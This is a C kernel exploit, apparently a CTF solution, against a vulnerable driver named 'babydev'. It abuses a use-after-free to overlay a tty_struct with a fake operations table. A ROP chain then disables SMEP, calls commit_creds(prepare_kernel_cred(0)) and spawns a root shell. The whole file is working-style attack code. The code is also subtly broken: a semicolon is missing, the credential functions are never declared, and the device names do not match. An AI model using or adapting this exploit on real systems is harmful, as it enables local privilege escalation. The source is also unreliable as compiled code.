#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/prctl.h>

int fd1;
int fd2
size_t user_cs, user_ss, user_rflags, user_sp;
size_t prepare_kernel_cred_addr = 0xffffffff810a1810;
size_t commit_creds_addr = 0xffffffff810a1420;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("status has been saved");
}

void errpro(char* buf){
    printf("Error %s\n",buf);
    exit(-1);
}

void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)(*pkc(0));
    puts("root now\n");
}

void get_shell(){
    if(!getuid()){
        system("/bin/sh");
        puts("get shell");
    }
    else{
        errpro("get shell");
    }
}

void krealloc(int fd, size_t num){
    if(-1 == ioctl(fd, 0x10001, num)){
        errpro("krealloc");
    }
}
void* fake_tty_operations[30];
int main(){
    save_status();

    int i = 0;
    size_t rop[0x300] = { 0 };
    rop[i++] = 0xffffffff810d238d;
    rop[i++] = 0x6f0;
    rop[i++] = 0xffffffff81004d80;      // mov cr4, rdi; pop rbp; ret;
    rop[i++] = 0;
    rop[i++] = (size_t)get_root;
    rop[i++] = 0xffffffff81063694;      // swapgs; pop rbp; ret;
    rop[i++] = 0;
    rop[i++] = 0xffffffff814e35ef;      // iretq; ret;
    rop[i++] = (size_t)get_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    for(int i=0; i<30; i++){
        fake_tty_operations[i] = 0xFFFFFFFF8181BFC5; 
    }
    fake_tty_operations[0] = 0xffffffff810635f5;  //pop rax; pop rbp; ret;
    fake_tty_operations[1] = (size_t)rop;
    fake_tty_operations[2] = 0xFFFFFFFF8181BFC5;  // mov rsp,rax ; dec ebx ; ret
    
    fd1 = open("/dev/babydrv",2);
    if(fd1 < 0){
        errpro("Open dev1");
    }
    fd2 = open("/dev/babydev", 2);
    if(fd2 < 0){
        errpro("Open dev2");
    }

    krealloc(fd1, 0x2e0);
    close(fd1);

    int fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    size_t fake_tty_struct[4] = { 0 };
    read(fd2, fake_tty_struct, 32);
    fake_tty_struct[3] = (size_t)fake_tty_operations;
    write(fd2, fake_tty_struct, 32);

    char buf[0x8] = { 0 };
    write(fd_tty, buf, 8);

    close(fd2);
    return 0;
}